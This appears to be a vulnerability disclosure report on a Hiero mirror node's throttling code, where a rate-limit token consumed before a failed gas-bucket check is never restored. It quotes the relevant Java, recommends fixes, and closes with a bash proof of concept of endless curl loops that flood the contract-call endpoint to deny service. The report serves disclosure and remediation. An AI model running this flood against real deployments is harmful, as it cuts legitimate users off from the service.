### Title
Rate-Limit Token Leaked on Gas-Bucket Rejection Enables Sustained DoS Against Legitimate Users

### Summary
In `ThrottleManagerImpl.throttle()`, one `rateLimitBucket` token is unconditionally consumed before the `gasLimitBucket` check is performed. When the gas check fails, a `ThrottleException` is thrown but the already-consumed rate-limit token is never restored. Because `ContractController.call()` only catches `InvalidParametersException` (not `ThrottleException`) to invoke `restore()`, and `restore()` itself only refills the gas bucket anyway, an unprivileged attacker can continuously drain the shared `rateLimitBucket` without any actual EVM execution occurring, starving legitimate callers of their request quota.

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.throttle()` — `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, lines 37–42:

```java
if (!rateLimitBucket.tryConsume(1)) {           // ← token consumed here
    throw new ThrottleException(...);
} else if (!gasLimitBucket.tryConsume(          // ← may fail; token above is NOT returned
        throttleProperties.scaleGas(request.getGas()))) {
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
``` [1](#0-0) 

`restore()` only refills the gas bucket, never the rate-limit bucket:

```java
public void restore(long gas) {
    long tokens = throttleProperties.scaleGas(gas);
    if (tokens > 0) {
        gasLimitBucket.addTokens(tokens);   // rateLimitBucket untouched
    }
}
``` [2](#0-1) 

`ContractController.call()` only catches `InvalidParametersException` to call `restore()` — `ThrottleException` propagates uncaught, so `restore()` is never reached on a gas-bucket rejection:

```java
} catch (InvalidParametersException e) {
    throttleManager.restore(request.getGas());   // never called for ThrottleException
    throw e;
}
``` [3](#0-2) 

**Root cause:** The two bucket checks are not atomic and there is no compensating restore for the rate-limit token when the second (gas) check fails.

**Exploit flow:**

1. Attacker sends a burst of requests with `gas = maxGasLimit` (15 000 000) to exhaust the `gasLimitBucket`. With default settings: `scaleGas(15_000_000) = 1 500` tokens per request; bucket capacity = `scaleGas(7_500_000_000) = 750 000` tokens → 500 requests drain the gas bucket completely (exactly one second's worth of rate-limit quota).
2. Gas bucket is now at 0 and refills at 750 000 tokens/s. Attacker continues sending requests at the full 500 req/s rate limit. Each request: passes `rateLimitBucket.tryConsume(1)` (consuming 1 token), fails `gasLimitBucket.tryConsume(1500)` (bucket empty), throws `ThrottleException`. The rate-limit token is gone; no gas token is consumed; no EVM work is done.
3. The shared `rateLimitBucket` (capacity 500, refill 500/s) is continuously drained. Legitimate users receive HTTP 429 for every request. [4](#0-3) [5](#0-4) 

### Impact Explanation
The `rateLimitBucket` is a single shared application-wide bean (not per-IP). An attacker who holds the gas bucket at zero can consume the entire 500-token/s rate-limit quota with zero EVM processing cost, completely blocking all other callers. The service becomes unavailable for legitimate users for as long as the attack is sustained. No authentication or special privilege is required.

### Likelihood Explanation
Any anonymous HTTP client can reach `POST /api/v1/contracts/call`. The attack requires only a sustained stream of ~500 req/s with `gas` set to the maximum allowed value — trivially achievable from a single machine or a small botnet. The attack is fully repeatable and self-sustaining: once the gas bucket is pinned at zero, every subsequent request costs the attacker nothing (no EVM work) while costing legitimate users their rate-limit quota.

### Recommendation
Restore the rate-limit token when the gas check fails. The simplest fix is to add `rateLimitBucket.addTokens(1)` before throwing the gas-limit `ThrottleException` in `ThrottleManagerImpl.throttle()`:

```java
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    rateLimitBucket.addTokens(1);   // compensate the already-consumed token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, reverse the check order (gas first, rate-limit second) so that a gas rejection never touches the rate-limit bucket. Also extend `restore()` to accept a boolean flag (or a separate method) to optionally restore the rate-limit token, and update `ContractController.call()` to catch `ThrottleException` from the gas path and call it.

### Proof of Concept

```bash
# Step 1: exhaust the gas bucket (500 requests × 15M gas = 750 000 scaled tokens)
for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST http://<host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}' &
done
wait

# Step 2: sustain the attack — each request passes rate-limit check, fails gas check,
#         consumes 1 rate-limit token, does zero EVM work
while true; do
  for i in $(seq 1 500); do
    curl -s -o /dev/null -X POST http://<host>/api/v1/contracts/call \
      -H 'Content-Type: application/json' \
      -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}' &
  done
  wait
  sleep 1
done

# Legitimate user — receives HTTP 429 for every request while attack is running
curl -v -X POST http://<host>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000,"data":"0x"}'
# Expected: HTTP/1.1 429 Too Many Requests
```

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L59-64)
```java
    public void restore(long gas) {
        long tokens = throttleProperties.scaleGas(gas);
        if (tokens > 0) {
            gasLimitBucket.addTokens(tokens);
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/ContractController.java (L46-50)
```java
        } catch (InvalidParametersException e) {
            // The validation failed, but no processing occurred so restore the consumed tokens.
            throttleManager.restore(request.getGas());
            throw e;
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```
